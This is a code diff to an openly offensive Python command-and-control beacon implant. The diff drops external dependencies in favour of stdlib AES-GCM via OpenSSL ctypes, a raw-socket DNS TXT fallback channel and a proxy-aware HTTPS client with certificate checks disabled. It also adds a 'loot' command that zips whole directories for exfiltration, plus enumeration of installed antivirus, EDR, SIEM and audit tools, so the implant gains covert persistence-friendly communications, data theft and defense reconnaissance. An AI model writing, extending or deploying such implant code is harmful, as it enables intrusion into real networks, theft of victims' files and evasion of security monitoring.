@@ -3,10 +3,15 @@
 C2 beacon with HTTPS primary and DNS fallback channels.
 AES-GCM encrypted payloads, Venom-style network evasion,
 full command set with result reporting.
+
+Zero external dependencies — stdlib only.
 """
 
 import base64
+import ctypes
+import ctypes.util
 import hashlib
+import io
 import json
 import logging
 import os
@@ -17,18 +22,570 @@ import shutil
 import socket
 import ssl
 import stat
+import struct
 import subprocess
 import sys
 import threading
 import time
+import urllib.error
+import zipfile
+import urllib.request
 from pathlib import Path
 from typing import Optional
 
-import requests
-import dns.resolver
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-
 logger = logging.getLogger("raccoon.c2")
+
+
+# ── Stdlib AES-256-GCM via OpenSSL ctypes ──
+
+def _load_libcrypto():
+    """Load OpenSSL libcrypto that ships with Python's ssl module."""
+    for name in ("libcrypto-3", "libcrypto-3-x64", "libcrypto-1_1",
+                 "libcrypto-1_1-x64", "libcrypto"):
+        path = ctypes.util.find_library(name)
+        if path:
+            try:
+                return ctypes.CDLL(path)
+            except OSError:
+                continue
+    ssl_path = getattr(ssl, "_ssl", None)
+    if ssl_path and hasattr(ssl._ssl, "__file__"):
+        d = os.path.dirname(ssl._ssl.__file__)
+        for fn in os.listdir(d):
+            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
+                try:
+                    return ctypes.CDLL(os.path.join(d, fn))
+                except OSError:
+                    continue
+    ssl_dir = os.path.dirname(ssl.__file__)
+    parent = os.path.dirname(ssl_dir)
+    for search_dir in (ssl_dir, parent, os.path.join(parent, "DLLs"),
+                       os.path.join(sys.prefix, "DLLs"),
+                       os.path.join(sys.prefix, "lib")):
+        if not os.path.isdir(search_dir):
+            continue
+        for fn in os.listdir(search_dir):
+            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
+                try:
+                    return ctypes.CDLL(os.path.join(search_dir, fn))
+                except OSError:
+                    continue
+    raise OSError("Cannot find OpenSSL libcrypto — required for AES-GCM")
+
+
+_crypto = _load_libcrypto()
+
+_crypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
+_crypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
+_crypto.EVP_aes_256_gcm.restype = ctypes.c_void_p
+_crypto.EVP_EncryptInit_ex.argtypes = [
+    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
+    ctypes.c_char_p, ctypes.c_char_p,
+]
+_crypto.EVP_EncryptInit_ex.restype = ctypes.c_int
+_crypto.EVP_DecryptInit_ex.argtypes = [
+    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
+    ctypes.c_char_p, ctypes.c_char_p,
+]
+_crypto.EVP_DecryptInit_ex.restype = ctypes.c_int
+_crypto.EVP_EncryptUpdate.argtypes = [
+    ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
+    ctypes.c_char_p, ctypes.c_int,
+]
+_crypto.EVP_EncryptUpdate.restype = ctypes.c_int
+_crypto.EVP_DecryptUpdate.argtypes = [
+    ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
+    ctypes.c_char_p, ctypes.c_int,
+]
+_crypto.EVP_DecryptUpdate.restype = ctypes.c_int
+_crypto.EVP_EncryptFinal_ex.argtypes = [
+    ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
+]
+_crypto.EVP_EncryptFinal_ex.restype = ctypes.c_int
+_crypto.EVP_DecryptFinal_ex.argtypes = [
+    ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
+]
+_crypto.EVP_DecryptFinal_ex.restype = ctypes.c_int
+_crypto.EVP_CIPHER_CTX_ctrl.argtypes = [
+    ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_char_p,
+]
+_crypto.EVP_CIPHER_CTX_ctrl.restype = ctypes.c_int
+
+EVP_CTRL_GCM_SET_IVLEN = 0x9
+EVP_CTRL_GCM_GET_TAG = 0x10
+EVP_CTRL_GCM_SET_TAG = 0x11
+GCM_TAG_LEN = 16
+
+
+def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
+    ctx = _crypto.EVP_CIPHER_CTX_new()
+    if not ctx:
+        raise RuntimeError("EVP_CIPHER_CTX_new failed")
+    try:
+        cipher = _crypto.EVP_aes_256_gcm()
+        if _crypto.EVP_EncryptInit_ex(ctx, cipher, None, None, None) != 1:
+            raise RuntimeError("EncryptInit_ex (cipher) failed")
+        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
+            raise RuntimeError("Set IV length failed")
+        if _crypto.EVP_EncryptInit_ex(ctx, None, None, key, nonce) != 1:
+            raise RuntimeError("EncryptInit_ex (key/iv) failed")
+
+        outlen = ctypes.c_int(0)
+        out = ctypes.create_string_buffer(len(plaintext) + 16)
+        if _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), plaintext, len(plaintext)) != 1:
+            raise RuntimeError("EncryptUpdate failed")
+        ct_len = outlen.value
+
+        final_buf = ctypes.create_string_buffer(16)
+        final_len = ctypes.c_int(0)
+        if _crypto.EVP_EncryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
+            raise RuntimeError("EncryptFinal_ex failed")
+        ct_len += final_len.value
+
+        tag = ctypes.create_string_buffer(GCM_TAG_LEN)
+        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN, tag) != 1:
+            raise RuntimeError("Get tag failed")
+
+        return out.raw[:ct_len] + tag.raw
+    finally:
+        _crypto.EVP_CIPHER_CTX_free(ctx)
+
+
+def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
+    if len(ciphertext_with_tag) < GCM_TAG_LEN:
+        raise ValueError("Ciphertext too short")
+    ct = ciphertext_with_tag[:-GCM_TAG_LEN]
+    tag = ciphertext_with_tag[-GCM_TAG_LEN:]
+
+    ctx = _crypto.EVP_CIPHER_CTX_new()
+    if not ctx:
+        raise RuntimeError("EVP_CIPHER_CTX_new failed")
+    try:
+        cipher = _crypto.EVP_aes_256_gcm()
+        if _crypto.EVP_DecryptInit_ex(ctx, cipher, None, None, None) != 1:
+            raise RuntimeError("DecryptInit_ex (cipher) failed")
+        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
+            raise RuntimeError("Set IV length failed")
+        if _crypto.EVP_DecryptInit_ex(ctx, None, None, key, nonce) != 1:
+            raise RuntimeError("DecryptInit_ex (key/iv) failed")
+
+        outlen = ctypes.c_int(0)
+        out = ctypes.create_string_buffer(len(ct) + 16)
+        if _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), ct, len(ct)) != 1:
+            raise RuntimeError("DecryptUpdate failed")
+        pt_len = outlen.value
+
+        tag_buf = ctypes.create_string_buffer(tag)
+        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LEN, tag_buf) != 1:
+            raise RuntimeError("Set tag failed")
+
+        final_buf = ctypes.create_string_buffer(16)
+        final_len = ctypes.c_int(0)
+        if _crypto.EVP_DecryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
+            raise ValueError("GCM authentication failed — wrong key or corrupted data")
+        pt_len += final_len.value
+
+        return out.raw[:pt_len]
+    finally:
+        _crypto.EVP_CIPHER_CTX_free(ctx)
+
+
+# ── Stdlib DNS resolver (TXT + A records) ──
+
+def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
+    """Minimal DNS query using raw UDP sockets. Returns list of strings (TXT) or IPs (A)."""
+    qtypes = {"A": 1, "TXT": 16}
+    qtype_num = qtypes.get(qtype.upper(), 1)
+
+    txn_id = random.randint(0, 0xFFFF)
+    flags = 0x0100  # standard query, recursion desired
+    header = struct.pack("!HHHHHH", txn_id, flags, 1, 0, 0, 0)
+
+    qname = b""
+    for label in name.encode().split(b"."):
+        qname += struct.pack("B", len(label)) + label
+    qname += b"\x00"
+    question = qname + struct.pack("!HH", qtype_num, 1)  # QCLASS=IN
+
+    packet = header + question
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(timeout)
+    try:
+        sock.sendto(packet, (server, 53))
+        data, _ = sock.recvfrom(4096)
+    finally:
+        sock.close()
+
+    if len(data) < 12:
+        return []
+
+    _, resp_flags, qdcount, ancount = struct.unpack("!HHHH", data[:8])
+    rcode = resp_flags & 0x0F
+    if rcode != 0:
+        return []
+
+    offset = 12
+    for _ in range(qdcount):
+        while offset < len(data):
+            length = data[offset]
+            if length == 0:
+                offset += 1
+                break
+            if (length & 0xC0) == 0xC0:
+                offset += 2
+                break
+            offset += 1 + length
+        offset += 4  # QTYPE + QCLASS
+
+    results = []
+    for _ in range(ancount):
+        if offset >= len(data):
+            break
+        if (data[offset] & 0xC0) == 0xC0:
+            offset += 2
+        else:
+            while offset < len(data):
+                length = data[offset]
+                if length == 0:
+                    offset += 1
+                    break
+                offset += 1 + length
+
+        if offset + 10 > len(data):
+            break
+        rtype, rclass, ttl, rdlength = struct.unpack("!HHIH", data[offset:offset + 10])
+        offset += 10
+        rdata = data[offset:offset + rdlength]
+        offset += rdlength
+
+        if rtype == 1 and len(rdata) == 4:  # A record
+            results.append(f"{rdata[0]}.{rdata[1]}.{rdata[2]}.{rdata[3]}")
+        elif rtype == 16:  # TXT record
+            txt_offset = 0
+            txt_parts = []
+            while txt_offset < len(rdata):
+                txt_len = rdata[txt_offset]
+                txt_offset += 1
+                txt_parts.append(rdata[txt_offset:txt_offset + txt_len])
+                txt_offset += txt_len
+            results.append(b"".join(txt_parts).decode("utf-8", errors="replace"))
+
+    return results
+
+
+# ── Stdlib HTTP client ──
+
+class _HttpSession:
+    """Minimal HTTP session using urllib — replaces requests.Session."""
+
+    def __init__(self):
+        self.proxies: dict = {}
+        self.trust_env: bool = True
+        self._cookie_jar = urllib.request.HTTPCookieProcessor()
+
+    def _build_opener(self):
+        handlers = [self._cookie_jar]
+        ssl_ctx = ssl.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode = ssl.CERT_NONE
+        handlers.append(urllib.request.HTTPSHandler(context=ssl_ctx))
+
+        if self.proxies:
+            handlers.append(urllib.request.ProxyHandler(self.proxies))
+        elif not self.trust_env:
+            handlers.append(urllib.request.ProxyHandler({}))
+
+        return urllib.request.build_opener(*handlers)
+
+    def post(self, url: str, json_data: dict, headers: dict,
+             timeout: float = 30) -> "_HttpResponse":
+        body = json.dumps(json_data, separators=(",", ":")).encode()
+        req = urllib.request.Request(url, data=body, method="POST")
+        for k, v in headers.items():
+            req.add_header(k, v)
+        if "Content-Type" not in headers:
+            req.add_header("Content-Type", "application/json")
+
+        opener = self._build_opener()
+        try:
+            resp = opener.open(req, timeout=timeout)
+            return _HttpResponse(resp.getcode(), resp.read())
+        except urllib.error.HTTPError as e:
+            return _HttpResponse(e.code, e.read() if hasattr(e, "read") else b"")
+        except urllib.error.URLError as e:
+            if "proxy" in str(e.reason).lower() or "tunnel" in str(e.reason).lower():
+                raise _ProxyError(str(e.reason)) from e
+            raise
+
+    def head(self, url: str, timeout: float = 10) -> "_HttpResponse":
+        req = urllib.request.Request(url, method="HEAD")
+        opener = self._build_opener()
+        try:
+            resp = opener.open(req, timeout=timeout)
+            return _HttpResponse(resp.getcode(), b"")
+        except urllib.error.HTTPError as e:
+            return _HttpResponse(e.code, b"")
+
+
+class _HttpResponse:
+    def __init__(self, status_code: int, body: bytes):
+        self.status_code = status_code
+        self._body = body
+
+    def json(self) -> dict:
+        return json.loads(self._body)
+
+
+class _ProxyError(Exception):
+    pass
+
+
+# ── Proxy discovery ──
+
+class ProxyDiscovery:
+    """Discovers HTTP/HTTPS proxies from environment, system settings, PAC/WPAD, and px."""
+
+    def __init__(self):
+        self._discovered: list[dict] = []
+        self._active_proxy: Optional[dict] = None
+
+    def discover_all(self) -> list[dict]:
+        self._discovered = []
+        self._detect_px_proxy()
+        self._detect_env_proxy()
+        self._detect_system_proxy()
+        self._detect_wpad()
+        seen = set()
+        unique = []
+        for p in self._discovered:
+            key = p.get("url", "")
+            if key and key not in seen:
+                seen.add(key)
+                unique.append(p)
+        self._discovered = unique
+        return self._discovered
+
+    @property
+    def proxies(self) -> list[dict]:
+        return self._discovered
+
+    @property
+    def active(self) -> Optional[dict]:
+        return self._active_proxy
+
+    def get_urllib_proxies(self) -> Optional[dict]:
+        if not self._active_proxy:
+            return None
+        url = self._active_proxy["url"]
+        return {"http": url, "https": url}
+
+    def select_working(self, test_url: str, timeout: float = 10) -> Optional[dict]:
+        for proxy in self._discovered:
+            try:
+                proxy_handler = urllib.request.ProxyHandler({
+                    "http": proxy["url"], "https": proxy["url"],
+                })
+                ssl_ctx = ssl.create_default_context()
+                ssl_ctx.check_hostname = False
+                ssl_ctx.verify_mode = ssl.CERT_NONE
+                opener = urllib.request.build_opener(
+                    proxy_handler,
+                    urllib.request.HTTPSHandler(context=ssl_ctx),
+                )
+                req = urllib.request.Request(test_url, method="HEAD")
+                resp = opener.open(req, timeout=timeout)
+                if resp.getcode() < 500:
+                    self._active_proxy = proxy
+                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
+                    return proxy
+            except urllib.error.HTTPError as e:
+                if e.code < 500:
+                    self._active_proxy = proxy
+                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
+                    return proxy
+            except Exception:
+                logger.debug("Proxy failed: %s", proxy["url"])
+        self._active_proxy = None
+        return None
+
+    def _detect_px_proxy(self):
+        for port in (3128, 8080, 8888):
+            s = None
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                s.connect(("127.0.0.1", port))
+                self._discovered.append({
+                    "url": f"http://127.0.0.1:{port}",
+                    "source": f"px-proxy (localhost:{port})",
+                    "auth": "ntlm-passthrough",
+                })
+            except Exception:
+                pass
+            finally:
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+
+    def _detect_env_proxy(self):
+        for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy",
+                     "ALL_PROXY", "all_proxy"):
+            val = os.environ.get(var, "").strip()
+            if val:
+                if not val.startswith(("http://", "https://", "socks")):
+                    val = "http://" + val
+                self._discovered.append({
+                    "url": val,
+                    "source": f"env:{var}",
+                    "auth": "from-url" if "@" in val else "none",
+                })
+
+    def _detect_system_proxy(self):
+        if platform.system() == "Windows":
+            self._detect_windows_proxy()
+        elif platform.system() == "Darwin":
+            self._detect_macos_proxy()
+        else:
+            self._detect_linux_proxy()
+
+    def _detect_windows_proxy(self):
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
+            enabled, _ = winreg.QueryValueEx(key, "ProxyEnable")
+            if enabled:
+                server, _ = winreg.QueryValueEx(key, "ProxyServer")
+                if server:
+                    if "=" in server:
+                        for part in server.split(";"):
+                            if "=" in part:
+                                proto, addr = part.split("=", 1)
+                                if proto.lower() in ("http", "https"):
+                                    url = addr if addr.startswith("http") else f"http://{addr}"
+                                    self._discovered.append({
+                                        "url": url, "source": "windows-registry",
+                                        "auth": "ntlm-possible",
+                                    })
+                    else:
+                        url = server if server.startswith("http") else f"http://{server}"
+                        self._discovered.append({
+                            "url": url, "source": "windows-registry",
+                            "auth": "ntlm-possible",
+                        })
+            try:
+                pac_url, _ = winreg.QueryValueEx(key, "AutoConfigURL")
+                if pac_url:
+                    self._discovered.append({
+                        "url": pac_url, "source": "windows-pac",
+                        "auth": "pac", "is_pac": True,
+                    })
+            except FileNotFoundError:
+                pass
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+
+    def _detect_linux_proxy(self):
+        try:
+            r = subprocess.run(
+                ["gsettings", "get", "org.gnome.system.proxy", "mode"],
+                capture_output=True, text=True, timeout=3,
+            )
+            mode = r.stdout.strip().strip("'")
+            if mode == "manual":
+                for proto in ("http", "https"):
+                    host_r = subprocess.run(
+                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "host"],
+                        capture_output=True, text=True, timeout=3,
+                    )
+                    port_r = subprocess.run(
+                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "port"],
+                        capture_output=True, text=True, timeout=3,
+                    )
+                    host = host_r.stdout.strip().strip("'")
+                    port = port_r.stdout.strip()
+                    if host:
+                        self._discovered.append({
+                            "url": f"http://{host}:{port or '8080'}",
+                            "source": f"gnome-{proto}",
+                            "auth": "none",
+                        })
+            elif mode == "auto":
+                pac_r = subprocess.run(
+                    ["gsettings", "get", "org.gnome.system.proxy", "autoconfig-url"],
+                    capture_output=True, text=True, timeout=3,
+                )
+                pac = pac_r.stdout.strip().strip("'")
+                if pac:
+                    self._discovered.append({
+                        "url": pac, "source": "gnome-pac",
+                        "auth": "pac", "is_pac": True,
+                    })
+        except Exception:
+            pass
+
+    def _detect_macos_proxy(self):
+        try:
+            r = subprocess.run(
+                ["networksetup", "-getwebproxy", "Wi-Fi"],
+                capture_output=True, text=True, timeout=5,
+            )
+            info = {}
+            for line in r.stdout.splitlines():
+                if ":" in line:
+                    k, v = line.split(":", 1)
+                    info[k.strip().lower()] = v.strip()
+            if info.get("enabled") == "Yes":
+                host = info.get("server", "")
+                port = info.get("port", "8080")
+                if host:
+                    self._discovered.append({
+                        "url": f"http://{host}:{port}",
+                        "source": "macos-networksetup",
+                        "auth": "none",
+                    })
+        except Exception:
+            pass
+
+    def _detect_wpad(self):
+        try:
+            addr = socket.gethostbyname("wpad")
+            if addr:
+                wpad_url = f"http://{addr}/wpad.dat"
+                self._discovered.append({
+                    "url": wpad_url, "source": "wpad-dns",
+                    "auth": "wpad", "is_pac": True,
+                })
+        except Exception:
+            pass
+        try:
+            fqdn = socket.getfqdn()
+            parts = fqdn.split(".")
+            if len(parts) > 1:
+                domain = ".".join(parts[1:])
+                wpad_host = f"wpad.{domain}"
+                addr = socket.gethostbyname(wpad_host)
+                if addr:
+                    wpad_url = f"http://{addr}/wpad.dat"
+                    self._discovered.append({
+                        "url": wpad_url, "source": f"wpad-domain ({domain})",
+                        "auth": "wpad", "is_pac": True,
+                    })
+        except Exception:
+            pass
+
+    def summary(self) -> str:
+        if not self._discovered:
+            return "No proxies discovered — using direct connection"
+        lines = [f"Discovered {len(self._discovered)} proxy candidate(s):"]
+        for i, p in enumerate(self._discovered):
+            active = " [ACTIVE]" if p == self._active_proxy else ""
+            lines.append(f"  [{i+1}] {p['url']} ({p['source']}, auth={p.get('auth','?')}){active}")
+        return "\n".join(lines)
 
 
 # ── Evasion pools ──
@@ -132,7 +689,13 @@ class Beacon:
         else:
             seed = f"{self.callback_url}:{self.dns_domain}".encode()
             self._key = hashlib.sha256(seed).digest()
-        self._aesgcm = AESGCM(self._key)
+
+        proxy_cfg = c2.get("proxy", {})
+        self.proxy_mode = proxy_cfg.get("mode", "auto")
+        self.proxy_url = proxy_cfg.get("url", "")
+
+        self._proxy = ProxyDiscovery()
+        self._proxy_session: Optional[_HttpSession] = None
 
         self._implant_id = self._generate_id()
         self._agent_id: Optional[str] = None
@@ -156,13 +719,13 @@ class Beacon:
     def _encrypt(self, data: dict) -> str:
         plaintext = json.dumps(data, separators=(",", ":")).encode()
         nonce = os.urandom(12)
-        ct = self._aesgcm.encrypt(nonce, plaintext, None)
+        ct = _aes_gcm_encrypt(self._key, nonce, plaintext)
         return base64.b64encode(nonce + ct).decode()
 
     def _decrypt(self, b64: str) -> dict:
         raw = base64.b64decode(b64)
         nonce, ct = raw[:12], raw[12:]
-        plaintext = self._aesgcm.decrypt(nonce, ct, None)
+        plaintext = _aes_gcm_decrypt(self._key, nonce, ct)
         return json.loads(plaintext)
 
     # ── Evasion helpers ──
@@ -214,7 +777,7 @@ class Beacon:
     # ── System info ──
 
     def _system_info(self) -> dict:
-        return {
+        info = {
             "id": self._implant_id,
             "agent_id": self._agent_id,
             "hostname": platform.node(),
@@ -225,7 +788,13 @@ class Beacon:
             "uptime": self._get_uptime(),
             "interval": self.interval,
             "local_ips": self._get_local_ips(),
+            "proxy_mode": self.proxy_mode,
         }
+        if self._proxy._active_proxy:
+            info["proxy_active"] = self._proxy._active_proxy["url"]
+        elif self._proxy_session and self._proxy_session.proxies:
+            info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")
+        return info
 
     @staticmethod
     def _get_local_ips() -> list:
@@ -271,19 +840,38 @@ class Beacon:
     # ── HTTPS transport ──
 
     def _https_post(self, endpoint: str, data: dict) -> Optional[dict]:
-        """POST encrypted payload; returns decrypted response or None on error."""
+        """POST encrypted payload via proxy-aware session; returns decrypted response or None."""
+        session = self._proxy_session or _HttpSession()
         try:
-            resp = requests.post(
+            resp = session.post(
                 self._evasive_url(endpoint),
-                json=self._wrap_payload(data),
+                json_data=self._wrap_payload(data),
                 headers=self._evasive_headers(),
-                verify=self.verify_ssl,
                 timeout=30,
             )
             if resp.status_code == 200:
                 body = resp.json()
                 result = self._unwrap_response(body)
                 return result if result else {}
+            if resp.status_code == 407:
+                logger.warning("Proxy auth required (407) — set proxy credentials in URL")
+        except _ProxyError as e:
+            logger.debug("Proxy error on %s: %s — retrying direct", endpoint, e)
+            try:
+                direct = _HttpSession()
+                direct.trust_env = False
+                resp = direct.post(
+                    self._evasive_url(endpoint),
+                    json_data=self._wrap_payload(data),
+                    headers=self._evasive_headers(),
+                    timeout=30,
+                )
+                if resp.status_code == 200:
+                    body = resp.json()
+                    result = self._unwrap_response(body)
+                    return result if result else {}
+            except Exception:
+                pass
         except Exception as e:
             logger.debug("HTTPS %s failed: %s", endpoint, e)
         return None
@@ -325,14 +913,8 @@ class Beacon:
             encoded_id = base64.b32encode(agent.encode()).decode().rstrip("=").lower()
             query = f"{encoded_id}.b.{self.dns_domain}"
 
-            resolver = dns.resolver.Resolver()
-            resolver.nameservers = [self.dns_resolver]
-            resolver.timeout = 10
-            resolver.lifetime = 10
-
-            answers = resolver.resolve(query, "TXT")
-            for rdata in answers:
-                txt = b"".join(rdata.strings).decode()
+            results = _dns_query(query, "TXT", self.dns_resolver, timeout=10)
+            for txt in results:
                 try:
                     return self._decrypt(txt)
                 except Exception:
@@ -464,6 +1046,46 @@ class Beacon:
                 "filename": Path(path).name,
                 "size": len(data),
                 "data": base64.b64encode(data).decode(),
+            }
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _exec_loot(self, path: str) -> dict:
+        """Zip a directory recursively and return as downloadable data."""
+        try:
+            p = Path(path)
+            if not p.exists():
+                return {"error": f"{path}: No such file or directory"}
+            if p.is_file():
+                return self._exec_download(path)
+            buf = io.BytesIO()
+            file_count = 0
+            max_size = 50 * 1024 * 1024
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
+                for root, dirs, files in os.walk(str(p)):
+                    for fn in files:
+                        fp = Path(root) / fn
+                        try:
+                            arcname = str(fp.relative_to(p))
+                            if fp.stat().st_size > max_size:
+                                continue
+                            zf.write(str(fp), arcname)
+                            file_count += 1
+                        except (PermissionError, OSError):
+                            continue
+                        if buf.tell() > max_size:
+                            break
+                    if buf.tell() > max_size:
+                        break
+            data = buf.getvalue()
+            dirname = p.name or "root"
+            filename = f"{dirname}.zip"
+            return {
+                "filename": filename,
+                "size": len(data),
+                "files": file_count,
+                "data": base64.b64encode(data).decode(),
+                "loot": True,
             }
         except Exception as e:
             return {"error": str(e)}
@@ -725,6 +1347,251 @@ class Beacon:
 
         except Exception as e:
             return f"[error] {e}"
+
+    def _exec_proxyinfo(self) -> str:
+        lines = [f"Proxy mode: {self.proxy_mode}"]
+        if self.proxy_url:
+            lines.append(f"Configured URL: {self.proxy_url}")
+        lines.append("")
+        lines.append(self._proxy.summary())
+        if self._proxy_session and self._proxy_session.proxies:
+            lines.append("")
+            lines.append("Session proxies:")
+            for scheme, url in self._proxy_session.proxies.items():
+                lines.append(f"  {scheme}: {url}")
+        return "\n".join(lines)
+
+    # ── AV / EDR enumeration ──
+
+    _AV_SERVICES_WIN = [
+        ("WinDefend", "Windows Defender", "av"),
+        ("Sense", "Defender for Endpoint (EDR)", "edr"),
+        ("CbDefense", "Carbon Black Defense", "edr"),
+        ("CbDefenseSensor", "Carbon Black Sensor", "edr"),
+        ("CSFalconService", "CrowdStrike Falcon", "edr"),
+        ("SentinelAgent", "SentinelOne", "edr"),
+        ("SentinelStaticEngine", "SentinelOne Static", "edr"),
+        ("cyabortsvc", "Cortex XDR", "edr"),
+        ("CortexXDR", "Cortex XDR", "edr"),
+        ("elastic-agent", "Elastic Agent", "edr"),
+        ("elastic-endpoint", "Elastic Endpoint", "edr"),
+        ("xagt", "Trellix/FireEye HX", "edr"),
+        ("CylanceSvc", "Cylance", "edr"),
+        ("TaniumClient", "Tanium", "edr"),
+        ("QualysAgent", "Qualys Agent", "edr"),
+        ("ir_agent", "Rapid7 InsightAgent", "edr"),
+        ("AVP", "Kaspersky", "av"),
+        ("klnagent", "Kaspersky Network Agent", "av"),
+        ("EPSecurityService", "Bitdefender", "av"),
+        ("BDAuxSrv", "Bitdefender Aux", "av"),
+        ("SAVService", "Sophos AV", "edr"),
+        ("SophosAgent", "Sophos Agent", "edr"),
+        ("hmpalert", "Sophos Intercept X", "edr"),
+        ("McShield", "McAfee/Trellix", "av"),
+        ("masvc", "McAfee Agent", "av"),
+        ("mfemms", "McAfee Management", "av"),
+        ("ekrn", "ESET", "av"),
+        ("AvastSvc", "Avast", "av"),
+        ("avgnt", "AVG", "av"),
+        ("fshoster", "WithSecure/F-Secure", "av"),
+        ("ccSvcHst", "Symantec SEP", "av"),
+        ("SepMasterService", "Symantec Master", "av"),
+        ("SplunkForwarder", "Splunk Forwarder", "siem"),
+        ("splunkd", "Splunk Daemon", "siem"),
+        ("wazuh-agent", "Wazuh Agent", "siem"),
+        ("OssecSvc", "OSSEC", "siem"),
+        ("Sysmon", "Sysmon", "audit"),
+        ("Sysmon64", "Sysmon x64", "audit"),
+        ("osqueryd", "osquery", "audit"),
+    ]
+
+    _AV_PROCS_LINUX = [
+        ("clamd", "ClamAV", "av"),
+        ("freshclam", "ClamAV Updater", "av"),
+        ("falcon-sensor", "CrowdStrike Falcon", "edr"),
+        ("cbagentd", "Carbon Black", "edr"),
+        ("SentinelAgent", "SentinelOne", "edr"),
+        ("elastic-agent", "Elastic Agent", "edr"),
+        ("elastic-endpoint", "Elastic Endpoint", "edr"),
+        ("xagt", "Trellix/FireEye HX", "edr"),
+        ("cortex-xdr", "Cortex XDR", "edr"),
+        ("splunkd", "Splunk", "siem"),
+        ("wazuh-agentd", "Wazuh", "siem"),
+        ("ossec-agentd", "OSSEC", "siem"),
+        ("ossec-syscheckd", "OSSEC Syscheck", "siem"),
+        ("auditd", "Linux Audit", "audit"),
+        ("osqueryd", "osquery", "audit"),
+        ("snort", "Snort IDS", "ids"),
+        ("suricata", "Suricata IDS", "ids"),
+        ("velociraptor", "Velociraptor DFIR", "dfir"),
+        ("grr_agent", "GRR Agent", "dfir"),
+        ("savd", "Sophos AV", "edr"),
+        ("SophosAgent", "Sophos Agent", "edr"),
+    ]
+
+    def _exec_avenum(self) -> str:
+        """Enumerate AV/EDR/SIEM/audit tools on the system."""
+        findings = []
+        system = platform.system()
+
+        if system == "Windows":
+            # Check services via sc query
+            for svc_name, display, cat in self._AV_SERVICES_WIN:
+                try:
+                    r = subprocess.run(
+                        ["sc", "query", svc_name],
+                        capture_output=True, text=True, timeout=5,
+                    )
+                    if r.returncode == 0 and "RUNNING" in r.stdout:
+                        findings.append((display, cat, "running"))
+                    elif r.returncode == 0 and "STOPPED" in r.stdout:
+                        findings.append((display, cat, "stopped"))
+                except Exception:
+                    pass
+
+            # WMI AntiVirusProduct (SecurityCenter2)
+            try:
+                r = subprocess.run(
+                    ["powershell", "-NoProfile", "-Command",
+                     "Get-CimInstance -Namespace root/SecurityCenter2 "
+                     "-ClassName AntiVirusProduct | "
+                     "Select-Object displayName,productState | "
+                     "Format-List"],
+                    capture_output=True, text=True, timeout=15,
+                )
+                if r.returncode == 0 and r.stdout.strip():
+                    for block in r.stdout.split("\n\n"):
+                        name = ""
+                        state = ""
+                        for line in block.splitlines():
+                            if "displayName" in line:
+                                name = line.split(":", 1)[-1].strip()
+                            if "productState" in line:
+                                state = line.split(":", 1)[-1].strip()
+                        if name:
+                            try:
+                                ps = int(state)
+                                enabled = bool((ps >> 12) & 1)
+                                updated = not bool((ps >> 4) & 1)
+                            except (ValueError, TypeError):
+                                enabled, updated = None, None
+                            status_parts = []
+                            if enabled is True:
+                                status_parts.append("enabled")
+                            elif enabled is False:
+                                status_parts.append("disabled")
+                            if updated is True:
+                                status_parts.append("up-to-date")
+                            elif updated is False:
+                                status_parts.append("outdated")
+                            status_str = ", ".join(status_parts) if status_parts else "registered"
+                            already = any(name.lower() in f[0].lower() for f in findings)
+                            if not already:
+                                findings.append((name, "av/wmi", status_str))
+            except Exception:
+                pass
+
+            # Check Windows Firewall
+            try:
+                r = subprocess.run(
+                    ["netsh", "advfirewall", "show", "allprofiles", "state"],
+                    capture_output=True, text=True, timeout=10,
+                )
+                if r.returncode == 0:
+                    on_count = r.stdout.lower().count("on")
+                    off_count = r.stdout.lower().count("off")
+                    findings.append(("Windows Firewall", "fw",
+                                     f"{on_count} on / {off_count} off"))
+            except Exception:
+                pass
+
+            # Check AMSI via registry
+            try:
+                r = subprocess.run(
+                    ["reg", "query",
+                     r"HKLM\SOFTWARE\Microsoft\AMSI\Providers"],
